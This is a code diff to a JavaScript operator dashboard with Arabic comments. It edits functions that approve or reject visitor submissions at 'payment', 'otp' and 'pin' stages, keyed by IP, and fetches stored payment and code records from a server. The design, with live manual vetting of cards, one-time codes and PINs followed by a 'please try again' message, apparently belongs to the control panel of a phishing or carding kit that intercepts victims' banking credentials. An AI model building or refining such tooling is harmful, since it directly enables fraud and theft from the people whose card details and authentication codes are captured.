@@ -769,10 +769,27 @@ async function rebuildCard(ip){
 }
 
 async function appv(ip,stage){
-  const l=ld[ip]||ld[norm(ip)];
-  if(!l){ console.warn('appv: no ld for ip',ip); return; }
-  const rid=l.requestId;
-  if(!rid){ console.warn('appv: no requestId'); return; }
+  // جلب requestId من ld أو من DB
+  let rid = null;
+  const l = ld[ip] || ld[norm(ip)];
+  if(l && l.requestId) rid = l.requestId;
+  // إذا لم يكن في ld، جلبه من DB
+  if(!rid){
+    try{
+      const r = await fetch(`${SRV}/api/data/${encodeURIComponent(ip)}`);
+      const ex = await r.json();
+      // جلب أحدث request_id من payment_data أو code_data حسب المرحلة
+      if(stage==='payment' && ex.payments && ex.payments.length>0){
+        rid = ex.payments[0].request_id;
+      } else if((stage==='otp'||stage==='pin') && ex.codes && ex.codes.length>0){
+        // أحدث كود من نوع المرحلة
+        const filtered = ex.codes.filter(c=>c.code_type===(stage==='otp'?'otp':'pin'));
+        if(filtered.length>0) rid = filtered[0].request_id;
+        if(!rid) rid = ex.codes[0].request_id;
+      }
+    }catch(e){ console.warn('appv: failed to fetch requestId from DB',e); }
+  }
+  if(!rid){ toast('⚠️ انتهت صلاحية الطلب أو تم معالجته'); return; }
   disableAbtns();
   try{
     const res=await fetch(`${SRV}/api/approve`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({requestId:rid})});
@@ -786,10 +803,25 @@ async function appv(ip,stage){
 }
 
 async function rejv(ip,stage){
-  const l=ld[ip]||ld[norm(ip)];
-  if(!l){ console.warn('rejv: no ld for ip',ip); return; }
-  const rid=l.requestId;
-  if(!rid){ console.warn('rejv: no requestId'); return; }
+  // جلب requestId من ld أو من DB
+  let rid = null;
+  const l = ld[ip] || ld[norm(ip)];
+  if(l && l.requestId) rid = l.requestId;
+  // إذا لم يكن في ld، جلبه من DB
+  if(!rid){
+    try{
+      const r = await fetch(`${SRV}/api/data/${encodeURIComponent(ip)}`);
+      const ex = await r.json();
+      if(stage==='payment' && ex.payments && ex.payments.length>0){
+        rid = ex.payments[0].request_id;
+      } else if((stage==='otp'||stage==='pin') && ex.codes && ex.codes.length>0){
+        const filtered = ex.codes.filter(c=>c.code_type===(stage==='otp'?'otp':'pin'));
+        if(filtered.length>0) rid = filtered[0].request_id;
+        if(!rid) rid = ex.codes[0].request_id;
+      }
+    }catch(e){ console.warn('rejv: failed to fetch requestId from DB',e); }
+  }
+  if(!rid){ toast('⚠️ انتهت صلاحية الطلب أو تم معالجته'); return; }
   const msg=(document.getElementById('rejMsgInp')?.value)||'تم رفض العملية. يرجى المحاولة مرة أخرى.';
   disableAbtns();
   try{
